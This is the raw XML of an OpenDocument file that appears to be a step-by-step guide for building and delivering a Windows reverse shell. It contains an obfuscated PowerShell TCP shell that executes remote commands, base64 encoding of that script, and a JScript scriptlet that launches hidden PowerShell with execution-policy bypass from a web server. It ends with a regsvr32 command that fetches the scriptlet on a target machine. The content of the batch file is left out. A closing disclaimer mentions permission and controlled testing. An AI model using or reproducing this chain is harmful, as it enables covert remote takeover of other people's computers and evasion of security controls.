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style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Heading_20_3">
      <style:text-properties style:font-name="Calibri" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Heading_20_4">
      <style:text-properties style:font-name="Calibri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T1" style:family="text">
      <style:text-properties style:font-name="Calibri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Step-by-Step Simulation Guide Note: Files available for adapting in repository .</text:h>
      <text:h text:style-name="P3" text:outline-level="4">1. Create the Reverse Shell PowerShell Script</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">Create a file named </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">reverse_shell.ps1</text:span></text:span><text:span text:style-name="T1"> with the following content:</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">param (</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>[string]$ip,</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>[int]$port</text:p>
      <text:p text:style-name="P1">)</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"># Obfuscated variable names</text:p>
      <text:p text:style-name="P1">$A = 'Get'+'Stream'</text:p>
      <text:p text:style-name="P1">$C = [System.Text.Encoding]::'ASCII'</text:p>
      <text:p text:style-name="P1">$b = 0..65535 | % {0}</text:p>
      <text:p text:style-name="P1">$Q = 'System.Net.Sockets.TCPClient'</text:p>
      <text:p text:style-name="P1">$w = 'Re'+'ad'</text:p>
      <text:p text:style-name="P1">$O = 'Wr'+'ite'</text:p>
      <text:p text:style-name="P1">$F = 'System.Text.ASCIIEncoding'</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">$client = New-Object $Q($ip, $port)</text:p>
      <text:p text:style-name="P1">$stream = $client.$A()</text:p>
      <text:p text:style-name="P1">while (($i = $stream.$w($b, 0, $b.Length)) -ne 0) {</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>$d = (New-Object -TypeName $F).GetString($b, 0, $i)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>$S = (iex $d 2&gt;&amp;1 | Out-String)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>$R = $S + "PS " + (pwd).Path + "&gt; "</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>$f = $C.GetBytes($R)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>$stream.$O($f, 0, $f.Length)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>$stream.Flush()</text:p>
      <text:p text:style-name="P1">}</text:p>
      <text:p text:style-name="P1">$client.Close()</text:p>
      <text:p text:style-name="P1"/>
      <text:h text:style-name="P3" text:outline-level="4"/>
      <text:p text:style-name="P1"/>
      <text:h text:style-name="P3" text:outline-level="4"><text:soft-page-break/>2. Encode the Script to Base64</text:h>
      <text:p text:style-name="P1">Run the following PowerShell commands to encode the script:</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">$script = Get-Content -Path .\reverse_shell.ps1 -Raw</text:p>
      <text:p text:style-name="P1">$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)</text:p>
      <text:p text:style-name="P1">$encoded = [Convert]::ToBase64String($bytes)</text:p>
      <text:p text:style-name="P1">$encoded</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Copy the resulting Base64 string.</text:p>
      <text:h text:style-name="P3" text:outline-level="4">3. Create the Batch File</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">Create a file named </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">run_reverse_shell.bat</text:span></text:span><text:span text:style-name="T1"> with the following content. Replace </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">&lt;Base64_encoded_string&gt;</text:span></text:span><text:span text:style-name="T1"> with the Base64 string you copied:</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:h text:style-name="P3" text:outline-level="4">4. Host the Files on a Web Server</text:h>
      <text:list xml:id="list7824854668324821519" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P8"><text:span text:style-name="T1">Upload </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">run_reverse_shell.bat</text:span></text:span><text:span text:style-name="T1"> to your web server.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="T1">Ensure it is accessible, e.g., </text:span><text:a xlink:type="simple" xlink:href="http://yourserver.com/run_reverse_shell.bat" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">http://yourserver.com/run_reverse_shell.bat</text:span></text:span></text:a><text:span text:style-name="T1">.<text:line-break/></text:span></text:p>
          <text:p text:style-name="P5">5. Create the SCT File</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">Create a file named </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">reverse_shell.sct</text:span></text:span><text:span text:style-name="T1"> with the following content. Replace </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">http://yourserver.com/run_reverse_shell.bat</text:span></text:span><text:span text:style-name="T1"> with the actual URL of your hosted batch file, and replace </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">attacker_ip</text:span></text:span><text:span text:style-name="T1"> and </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">attacker_port</text:span></text:span><text:span text:style-name="T1"> with your attacker's IP and port:</text:span></text:p>
      <text:p text:style-name="P1">&lt;scriptlet&gt;</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>&lt;registration&gt;</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>&lt;script language="JScript"&gt;</text:p>
      <text:p text:style-name="P1"><text:s text:c="6"/>&lt;![CDATA[</text:p>
      <text:p text:style-name="P1"><text:s text:c="8"/>var shell = new ActiveXObject("WScript.Shell");</text:p>
      <text:p text:style-name="P1"><text:s text:c="8"/>shell.Run("cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File http://yourserver.com/run_reverse_shell.bat attacker_ip attacker_port");</text:p>
      <text:p text:style-name="P1"><text:s text:c="6"/>]]&gt;</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>&lt;/script&gt;</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>&lt;/registration&gt;</text:p>
      <text:p text:style-name="P1">&lt;/scriptlet&gt;</text:p>
      <text:p text:style-name="P1"/>
      <text:list xml:id="list5878484928381271690" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P9"><text:span text:style-name="T1">Upload </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">reverse_shell.sct</text:span></text:span><text:span text:style-name="T1"> to your web server.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6"><text:span text:style-name="T1">Ensure it is accessible, e.g., </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">http://yourserver.com/reverse_shell.sct</text:span></text:span><text:span text:style-name="T1">.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="P3" text:outline-level="4"><text:soft-page-break/>6. Execute the SCT File using regsvr32</text:h>
      <text:p text:style-name="P1">On the target machine, run the following command to execute the SCT file:</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">regsvr32 /s /i:http://yourserver.com/reverse_shell.sct scrobj.dll</text:p>
      <text:p text:style-name="P1"/>
      <text:h text:style-name="P3" text:outline-level="4">7. Establish the Reverse Shell Connection</text:h>
      <text:p text:style-name="P1">When the SCT file is executed, it will download and run the batch file, which will decode and execute the PowerShell script to establish a reverse shell connection to the specified IP and port.</text:p>
      <text:h text:style-name="P2" text:outline-level="3">Important Notes</text:h>
      <text:list xml:id="list3656212893293120846" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P10"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Ethical Use</text:span></text:span><text:span text:style-name="T1">: Ensure you have explicit permission to test systems with this script. Unauthorised use is illegal and unethical.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P10"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Controlled Environment</text:span></text:span><text:span text:style-name="T1">: Use a controlled environment for testing.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P7"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Troubleshooting</text:span></text:span><text:span text:style-name="T1">: Keep a non-obfuscated version of the scripts for troubleshooting and maintenance.</text:span></text:p>
        </text:list-item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Waldron</meta:initial-creator>
    <meta:creation-date>2024-06-15T08:42:37.08</meta:creation-date>
    <dc:date>2024-07-28T12:58:13.22</dc:date>
    <dc:creator>Information Governance</dc:creator>
    <meta:editing-duration>PT11M1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61" meta:word-count="374" meta:character-count="2790"/>
  </office:meta>
</office:document-meta>
</file>